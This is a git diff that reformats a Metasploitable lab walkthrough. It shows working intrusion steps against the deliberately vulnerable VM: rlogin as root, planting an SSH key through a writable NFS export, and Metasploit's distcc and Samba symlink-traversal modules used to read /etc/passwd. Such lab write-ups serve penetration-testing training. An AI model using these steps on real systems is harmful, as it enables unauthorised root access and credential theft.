@@ -60,7 +60,7 @@ The following information shows the **Metasploitable walkthrough**
 
 nmap -Pn --script vuln 192.168.1.105
 
-   BOOM!!!!!!!!
+   
 
 # [](#header-1)Step 1: Exploitation and Acess Gaining
 
@@ -72,22 +72,22 @@ nmap -Pn --script vuln 192.168.1.105
    
    So open a terminal and type, 
    
-   **_# rlogin -l root ip_address_** 	
+	   # rlogin -l root ip_address	
 
-// if asks for password then probably rsh-client is not installed, else you will be in that target machine.
+	// if asks for password then probably rsh-client is not installed, else you will be in that target machine.
 
-   **_# apt install rsh-client_**
+	   # apt install rsh-client
 
-   now execute **_# rlogin -l root ip_address_** 	
+	   now execute, # rlogin -l root ip_address	
 
-// should work perfectly if that service is open
+	// should work perfectly if that service is open
 
 
 **_METHOD 2: SSH LOGIN_**
 
    For this we need to generate the RSA key and kinda have to copy that key to that target machine using rpcbind and NFS (port 2049) mount the NFS export (for exporting), and add our key to the root user account's authorized_keys file.
       
-	   **_# apt update
+	   # apt update
 
 	   # apt install rpcbind nfs-common
 
@@ -105,39 +105,39 @@ nmap -Pn --script vuln 192.168.1.105
 
 	   # umount /tmp/r00t
 
-	   # ssh root@ip_address_**
+	   # ssh root@ip_address
 
          
 **_METHOD 3: SMB 445_**
 
    Samba, can also be used as a backdoor to access files that were not meant to be shared when configured with a writeable file share and "wide links" enabled. I used Metasploit Framework to compromise the target.
 	
-   On msfconsole,
-   
-   > msf use exploit/unix/misc/distcc_
-   
-   > set rhost 192.168.214.129
-   
-   > exploit
-   
-   On another terminal
-   
-   # smbclient -L //ip_address
-   
-   On msfconsole,
-    
-   > use auxiliary/admin/smb/samba_symlink_traversal
+	   On msfconsole,
 
-   msf5 auxiliary(admin/smb/samba_symlink_traversal) > set rhost ip_address
-   
-   msf5 auxiliary(admin/smb/samba_symlink_traversal) > set SMBSHARE tmp
-   
-   msf5 auxiliary(admin/smb/samba_symlink_traversal) > exploit
+	   > msf use exploit/unix/misc/distcc_
 
-   On terminal,
-   
-   # smbclient  //ip_address/tmp
-			// now you will have the smb shell access, try #cd rootfs #cd etc and #more passwd
+	   > set rhost 192.168.214.129
+
+	   > exploit
+
+	   On another terminal
+
+	   # smbclient -L //ip_address
+
+	   On msfconsole,
+
+	   > use auxiliary/admin/smb/samba_symlink_traversal
+
+	   msf5 auxiliary(admin/smb/samba_symlink_traversal) > set rhost ip_address
+
+	   msf5 auxiliary(admin/smb/samba_symlink_traversal) > set SMBSHARE tmp
+
+	   msf5 auxiliary(admin/smb/samba_symlink_traversal) > exploit
+
+	   On terminal,
+
+	   # smbclient  //ip_address/tmp
+				// now you will have the smb shell access, try #cd rootfs #cd etc and #more passwd
 
 
 ```
